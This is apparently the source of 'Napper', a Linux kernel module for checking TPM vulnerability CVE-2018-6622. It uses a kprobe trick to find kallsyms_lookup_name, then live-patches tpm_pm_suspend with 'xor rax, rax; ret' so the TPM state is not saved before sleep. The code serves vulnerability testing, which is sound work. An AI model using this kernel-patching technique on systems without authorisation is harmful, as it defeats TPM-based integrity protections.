/**
 *                           Napper 
 *                        ------------
 *      TPM vulnerability checking tool for CVE-2018-6622 
 *
 *              Copyright (C) 2019 Seunghun Han
 *    at National Security Research Institute of South Korea
 *   Project link: https://github.com/kkamagui/napper-for-tpm
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <asm/text-patching.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Seunghun Han"); 
MODULE_VERSION("1.0"); 
MODULE_DESCRIPTION("Napper kernel module for checking a TPM vulnerability"); 

//kallsyms_lookup_name workaround

typedef unsigned long (*kln_p)(const char*);

#define KPROBE_PRE_HANDLER(fname) static int __kprobes fname(struct kprobe *p, struct pt_regs *regs)

long unsigned int kln_addr = 0;
unsigned long (*kln_pointer)(const char* name) = NULL;

static struct kprobe kp0, kp1;

KPROBE_PRE_HANDLER(handler_pre0) {
    kln_addr = (--regs->ip);

    return 0;
}

KPROBE_PRE_HANDLER(handler_pre1) {
    return 0;
}

static int do_register_kprobe(struct kprobe* kp, char* symbol_name, void* handler) {
    int ret;

    kp->symbol_name = symbol_name;
    kp->pre_handler = handler;

    ret = register_kprobe(kp);
    if (ret < 0) {
        pr_err("do_register_kprobe: failed to register for symbol %s, returning %d\n", symbol_name, ret);
        return ret;
    }

    pr_info("Planted krpobe for symbol %s at %p\n", symbol_name, kp->addr);

    return ret;
}

// this is the function that I have modified, as the name suggests it returns a pointer to the extracted kallsyms_lookup_name function
kln_p get_kln_p(void) {
    int status;

    status = do_register_kprobe(&kp0, "kallsyms_lookup_name", handler_pre0);

    if (status < 0) return NULL;

    status = do_register_kprobe(&kp1, "kallsyms_lookup_name", handler_pre1);

    if (status < 0) {
        // cleaning initial krpobe
        unregister_kprobe(&kp0);
        return NULL;
    }

    unregister_kprobe(&kp0);
    unregister_kprobe(&kp1);

    pr_info("kallsyms_lookup_name address = 0x%lx\n", kln_addr);

    kln_pointer = (unsigned long (*)(const char* name)) kln_addr;

    return kln_pointer;
}

#define kallsyms_lookup_name(name) (get_kln_p())(name);

//end kallsyms_lookup_name workaround

typedef void *(*TEXT_POKE) (void *addr, const void *opcode, size_t len);

TEXT_POKE g_fn_text_poke;
// XOR RAX, RAX; RET
unsigned char g_ret_op_code[] = {0x48, 0x31, 0xc0, 0xc3};
unsigned char g_org_op_code[sizeof(g_ret_op_code)];
unsigned long g_tpm_suspend_addr;

/**
 * Show banner.
 */
void print_banner(void)
{
	printk(KERN_INFO "napper:  /zz   /zz\n");
	printk(KERN_INFO "napper: | zzz | zz\n");
	printk(KERN_INFO "napper: | zzzz| zz  /zzzzzz   /zzzzzz   /zzzzzz   /zzzzzz   /zzzzzz \n");
	printk(KERN_INFO "napper: | zz zz zz |____  zz /zz__  zz /zz__  zz /zz__  zz /zz__  zz\n");
	printk(KERN_INFO "napper: | zz  zzzz  /zzzzzzz| zz  \\ zz| zz  \\ zz| zzzzzzzz| zz  \\__/\n");
	printk(KERN_INFO "napper: | zz\\  zzz /zz__  zz| zz  | zz| zz  | zz| zz_____/| zz\n");
	printk(KERN_INFO "napper: | zz \\  zz|  zzzzzzz| zzzzzzz/| zzzzzzz/|  zzzzzzz| zz\n");
	printk(KERN_INFO "napper: |__/  \\__/ \\_______/| zz____/ | zz____/  \\_______/|__/\n");
	printk(KERN_INFO "napper:                     | zz      | zz\n");
	printk(KERN_INFO "napper:                     | zz      | zz\n");
	printk(KERN_INFO "napper:                     |__/      |__/\n");
	printk(KERN_INFO "napper: \n");
	printk(KERN_INFO "napper:      v1.2 for checking a TPM vulnerability, CVE-2018-6622\n");
	printk(KERN_INFO "napper:        Made by Seunghun Han, https://kkamagui.github.io\n");
	printk(KERN_INFO "napper:    Project link: https://github.com/kkamagui/napper-for-tpm\n");
	printk(KERN_INFO "napper: \n");
}


/**
 * Initialize this module.
 */
static int __init napper_init(void) 
{
	// Find functions
	g_fn_text_poke = (TEXT_POKE) kallsyms_lookup_name("text_poke");
	g_tpm_suspend_addr = kallsyms_lookup_name("tpm_pm_suspend");

	print_banner();

	printk(KERN_INFO "napper: tpm_pm_suspend address is %lX\n", g_tpm_suspend_addr);
	printk(KERN_INFO "napper: original code of tpm_pm_suspend\n");
	print_hex_dump(KERN_INFO, "napper: ", DUMP_PREFIX_ADDRESS,
		16, 1, (void*) g_tpm_suspend_addr, 16, 1);
	printk(KERN_INFO "napper: \n");

	// Backup first byte of tpm_suspend_addr function and patch it to xor and ret.
	memcpy(g_org_op_code, (unsigned char*) g_tpm_suspend_addr, sizeof(g_org_op_code));
	g_fn_text_poke((void*) g_tpm_suspend_addr, g_ret_op_code, sizeof(g_ret_op_code));

	printk(KERN_INFO "napper: patched code of tpm_pm_suspend\n");
	print_hex_dump(KERN_INFO, "napper: ", DUMP_PREFIX_ADDRESS,
		16, 1, (void*) g_tpm_suspend_addr, 16, 1);

	printk(KERN_INFO "napper: ready to sleep!\n");
	return 0; 
} 

/**
 * Terminate this module.
 */
static void __exit napper_exit(void) 
{ 
	printk(KERN_INFO "napper: recover code of tpm_pm_suspend\n");
	g_fn_text_poke((void*) g_tpm_suspend_addr, g_org_op_code, sizeof(g_org_op_code));
} 

module_init(napper_init); 
module_exit(napper_exit);
